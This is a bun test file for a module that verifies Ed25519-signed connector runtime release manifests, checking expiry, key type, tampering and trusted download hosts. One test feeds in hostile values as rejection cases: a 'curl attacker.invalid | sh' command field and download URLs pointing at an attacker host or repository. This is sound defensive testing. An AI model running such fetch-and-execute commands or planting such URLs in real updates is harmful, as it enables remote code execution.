import { generateKeyPairSync, sign, type KeyObject } from 'node:crypto';

import { describe, expect, test } from 'bun:test';

import {
  canonicalConnectorRuntimeReleaseManifest,
  connectorRuntimeReleaseManifestSchema,
  isConnectorRuntimeReleaseManifest,
  resolveConnectorRuntimeReleaseArtifact,
  verifyConnectorRuntimeReleaseManifest,
  type ConnectorRuntimeReleaseManifest
} from '../server/connector-runtime-release-manifest';

const now = Date.parse('2026-07-13T12:00:00.000Z');

function manifest(
  overrides: Partial<ConnectorRuntimeReleaseManifest> = {}
): ConnectorRuntimeReleaseManifest {
  const runtimeContract = {
    bundleVersions: {
      connector: '0.5.0',
      machineTools: '0.5.0',
      projectCli: '0.5.0'
    },
    capabilities: ['runtime.restart', 'runtime.update'],
    protocolVersion: '2'
  };
  return {
    artifacts: [
      {
        assetName: 'project-space-machine-tools-darwin-arm64-v0.5.0.tar.gz',
        ...runtimeContract,
        downloadUrl:
          'https://github.com/DotNaos/project-space/releases/download/v0.5.0/project-space-machine-tools-darwin-arm64-v0.5.0.tar.gz',
        sha256: 'a'.repeat(64),
        sizeBytes: 10_000_000,
        target: 'darwin-arm64'
      },
      {
        assetName: 'project-space-machine-tools-linux-x64-v0.5.0.tar.gz',
        ...runtimeContract,
        downloadUrl:
          'https://github.com/DotNaos/project-space/releases/download/v0.5.0/project-space-machine-tools-linux-x64-v0.5.0.tar.gz',
        sha256: 'b'.repeat(64),
        sizeBytes: 11_000_000,
        target: 'linux-x64'
      },
      {
        assetName: 'project-space-machine-tools-windows-x64-v0.5.0.exe',
        ...runtimeContract,
        downloadUrl:
          'https://github.com/DotNaos/project-space/releases/download/v0.5.0/project-space-machine-tools-windows-x64-v0.5.0.exe',
        sha256: 'c'.repeat(64),
        sizeBytes: 12_000_000,
        target: 'windows-x64'
      }
    ],
    buildId: '1'.repeat(40),
    channel: 'stable',
    expiresAt: '2026-07-15T12:00:00.000Z',
    issuedAt: '2026-07-13T11:00:00.000Z',
    releaseId: 'v0.5.0',
    schema: connectorRuntimeReleaseManifestSchema,
    source: 'managed',
    version: '0.5.0',
    ...overrides
  };
}

function signedManifest(
  value: ConnectorRuntimeReleaseManifest,
  privateKey: KeyObject
) {
  return {
    manifest: value,
    signature: sign(
      null,
      Buffer.from(canonicalConnectorRuntimeReleaseManifest(value), 'utf8'),
      privateKey
    ).toString('base64url')
  };
}

describe('connector runtime release manifests', () => {
  test('verifies a canonical Ed25519 signature and resolves artifacts server-side', () => {
    const keys = generateKeyPairSync('ed25519');
    const value = manifest();
    const verified = verifyConnectorRuntimeReleaseManifest(
      signedManifest(value, keys.privateKey),
      keys.publicKey,
      { now }
    );

    expect(verified).toEqual(value);
    expect(resolveConnectorRuntimeReleaseArtifact(verified, 'darwin-arm64')).toMatchObject({
      sha256: 'a'.repeat(64),
      target: 'darwin-arm64'
    });
    expect(resolveConnectorRuntimeReleaseArtifact(verified, 'linux-x64')).toMatchObject({
      sha256: 'b'.repeat(64),
      target: 'linux-x64'
    });
    expect(resolveConnectorRuntimeReleaseArtifact(verified, 'windows-x64')).toMatchObject({
      sha256: 'c'.repeat(64),
      target: 'windows-x64'
    });
  });

  test('rejects a tampered manifest even when it remains structurally valid', () => {
    const keys = generateKeyPairSync('ed25519');
    const envelope = signedManifest(manifest(), keys.privateKey);
    envelope.manifest = { ...envelope.manifest, buildId: '2'.repeat(40) };

    expect(() =>
      verifyConnectorRuntimeReleaseManifest(envelope, keys.publicKey, { now })
    ).toThrow('signature is invalid');
  });

  test('rejects expired, future-issued, and overlong validity periods', () => {
    const keys = generateKeyPairSync('ed25519');
    const cases = [
      manifest({
        expiresAt: '2026-07-13T11:59:59.999Z',
        issuedAt: '2026-07-12T12:00:00.000Z'
      }),
      manifest({
        expiresAt: '2026-07-14T12:06:00.000Z',
        issuedAt: '2026-07-13T12:06:00.000Z'
      }),
      manifest({
        expiresAt: '2027-07-19T11:00:00.001Z',
        issuedAt: '2026-07-13T11:00:00.000Z'
      })
    ];

    expect(() =>
      verifyConnectorRuntimeReleaseManifest(
        signedManifest(cases[0]!, keys.privateKey),
        keys.publicKey,
        { now }
      )
    ).toThrow('expired');
    expect(() =>
      verifyConnectorRuntimeReleaseManifest(
        signedManifest(cases[1]!, keys.privateKey),
        keys.publicKey,
        { now }
      )
    ).toThrow('issued in the future');
    expect(() =>
      verifyConnectorRuntimeReleaseManifest(
        signedManifest(cases[2]!, keys.privateKey),
        keys.publicKey,
        { now }
      )
    ).toThrow('validity period is invalid');
  });

  test('requires a dedicated Ed25519 verification key', () => {
    const signingKeys = generateKeyPairSync('ed25519');
    const wrongKeys = generateKeyPairSync('rsa', { modulusLength: 2048 });
    const envelope = signedManifest(manifest(), signingKeys.privateKey);

    expect(() =>
      verifyConnectorRuntimeReleaseManifest(envelope, wrongKeys.publicKey, { now })
    ).toThrow('must be Ed25519');
  });

  test('rejects duplicate targets, arbitrary fields, untrusted URLs, and mutable release ids', () => {
    const base = manifest();
    const duplicate = {
      ...base,
      artifacts: [base.artifacts[0], { ...base.artifacts[0] }]
    };
    const extra = { ...base, command: 'curl attacker.invalid | sh' };
    const insecure = {
      ...base,
      artifacts: [{ ...base.artifacts[0], downloadUrl: 'http://attacker.invalid/update' }]
    };
    const wrongHost = {
      ...base,
      artifacts: [
        {
          ...base.artifacts[0],
          downloadUrl:
            'https://attacker.invalid/DotNaos/project-space/releases/download/v0.5.0/project-space-machine-tools-darwin-arm64-v0.5.0.tar.gz'
        }
      ]
    };
    const wrongRepository = {
      ...base,
      artifacts: [
        {
          ...base.artifacts[0],
          downloadUrl:
            'https://github.com/attacker/project-space/releases/download/v0.5.0/project-space-machine-tools-darwin-arm64-v0.5.0.tar.gz'
        }
      ]
    };

    expect(isConnectorRuntimeReleaseManifest(duplicate)).toBe(false);
    expect(isConnectorRuntimeReleaseManifest(extra)).toBe(false);
    expect(isConnectorRuntimeReleaseManifest(insecure)).toBe(false);
    expect(isConnectorRuntimeReleaseManifest(wrongHost)).toBe(false);
    expect(isConnectorRuntimeReleaseManifest(wrongRepository)).toBe(false);
    expect(isConnectorRuntimeReleaseManifest({ ...base, releaseId: 'latest' })).toBe(false);
  });

  test('requires exact build, protocol, capability, source, and bundle evidence', () => {
    const base = manifest();
    const artifact = base.artifacts[0]!;

    expect(isConnectorRuntimeReleaseManifest({ ...base, buildId: 'development' })).toBe(false);
    expect(isConnectorRuntimeReleaseManifest({ ...base, source: 'source' })).toBe(false);
    expect(
      isConnectorRuntimeReleaseManifest({
        ...base,
        artifacts: [{ ...artifact, protocolVersion: 'latest' }]
      })
    ).toBe(false);
    expect(
      isConnectorRuntimeReleaseManifest({
        ...base,
        artifacts: [{ ...artifact, capabilities: ['runtime.update', 'runtime.restart'] }]
      })
    ).toBe(false);
    expect(
      isConnectorRuntimeReleaseManifest({
        ...base,
        artifacts: [
          {
            ...artifact,
            bundleVersions: { ...artifact.bundleVersions, machineTools: 'latest' }
          }
        ]
      })
    ).toBe(false);
  });

  test('rejects a wrong requested release and a release without the machine target', () => {
    const darwinOnly = manifest({ artifacts: [manifest().artifacts[0]!] });
    expect(() =>
      resolveConnectorRuntimeReleaseArtifact(darwinOnly, 'darwin-arm64', 'v0.6.0')
    ).toThrow('does not match');
    expect(() => resolveConnectorRuntimeReleaseArtifact(darwinOnly, 'linux-x64')).toThrow(
      'does not support linux-x64'
    );
  });
});
